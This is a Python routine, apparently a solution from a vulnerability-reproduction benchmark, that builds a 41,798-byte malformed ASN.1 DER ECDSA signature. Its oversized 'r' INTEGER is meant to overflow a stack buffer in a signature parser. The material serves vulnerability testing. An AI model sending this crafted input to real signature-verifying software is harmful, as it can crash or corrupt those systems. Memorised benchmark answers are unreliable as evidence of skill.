class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for a stack buffer overflow
        in ECDSA signature parsing from ASN.1.

        The vulnerability is a stack buffer overflow when parsing an ASN.1 DER
        encoded ECDSA signature. The signature is a SEQUENCE of two INTEGERS,
        'r' and 's'. A very large length field for one of the integers
        causes a buffer on the stack to be overflowed when the value is copied.

        This PoC is constructed to match the ground-truth length of 41798 bytes,
        which helps deduce the internal buffer sizes and the exact length needed
        to trigger the overflow.

        The structure is:
        - A main ASN.1 SEQUENCE (tag 0x30).
        - The first element is a large ASN.1 INTEGER (tag 0x02) for the 'r' value.
            - Its length is set to 41787 bytes.
            - This large length is the trigger for the overflow.
        - The second element is a small, valid ASN.1 INTEGER for the 's' value.

        The lengths are encoded using the multi-byte DER format (e.g., 0x82 followed
        by a 2-byte length) as the values exceed 127 bytes.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # The total length of the PoC is 41798 bytes.
        # We can deduce the required length of the malicious integer value
        # by deconstructing the ASN.1 structure:
        #
        # Total Length = 41798
        # Structure: SEQUENCE { INTEGER r, INTEGER s }
        #
        # PoC = 0x30 (seq tag) + len(seq_len) + seq_payload
        # seq_payload = r_integer + s_integer
        # r_integer = 0x02 (int tag) + len(r_len) + r_value
        #
        # Assuming 3-byte length fields (0x82 + 2 bytes for length)
        # and a small s_integer of 3 bytes (0x02 0x01 0x01):
        # 41798 = 1 (tag) + 3 (len) + len(r_integer) + 3 (s_integer)
        # => len(r_integer) = 41791
        #
        # len(r_integer) = 1 (tag) + 3 (len) + len(r_value)
        # 41791 = 1 + 3 + len(r_value)
        # => len(r_value) = 41787

        r_value_len = 41787
        
        # Use a value like 0x01 to ensure the MSB is not set, which would
        # otherwise require a leading 0x00 padding byte in ASN.1 encoding.
        r_value = b'\x01' * r_value_len
        
        # ASN.1 INTEGER 'r' (Type-Length-Value)
        # Type: 0x02 (INTEGER)
        # Length: 41787 (0xA33B), encoded as 0x82A33B
        r_len_bytes = b'\x82' + r_value_len.to_bytes(2, 'big')
        r_integer = b'\x02' + r_len_bytes + r_value
        
        # A small valid ASN.1 INTEGER 's' (value 1)
        s_integer = b'\x02\x01\x01'
        
        # The payload for the main SEQUENCE
        seq_payload = r_integer + s_integer
        seq_payload_len = len(seq_payload)
        
        # The main ASN.1 SEQUENCE (Type-Length-Value)
        # Type: 0x30 (SEQUENCE)
        # Length: seq_payload_len (41794 = 0xA342), encoded as 0x82A342
        seq_len_bytes = b'\x82' + seq_payload_len.to_bytes(2, 'big')
        poc = b'\x30' + seq_len_bytes + seq_payload
        
        return poc